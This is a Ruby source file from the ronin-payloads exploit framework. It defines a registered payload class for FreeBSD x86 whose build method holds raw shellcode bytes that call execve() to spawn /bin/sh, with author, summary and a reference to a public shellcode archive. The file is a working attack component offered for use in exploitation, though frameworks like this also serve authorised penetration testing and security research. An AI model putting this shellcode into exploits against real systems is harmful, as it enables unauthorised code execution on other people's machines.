# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2025 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module FreeBSD
        module X86
          #
          # FreeBSD x86 shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/freebsd/x86/exec_shell'

            arch :x86
            os :freebsd

            author 'Tash', email: 'tosh@tuxfamily.org'

            summary 'FreeBSD x86 execve() shellcode'
            description <<~DESC
              FreeBSD x86 shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-749.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
                         "\x68\x2f\x62\x69\x6e\x89\xe3\x50" \
                         "\x54\x53\xb0\x3b\x50\xcd\x80"
            end

          end
        end
      end
    end
  end
end
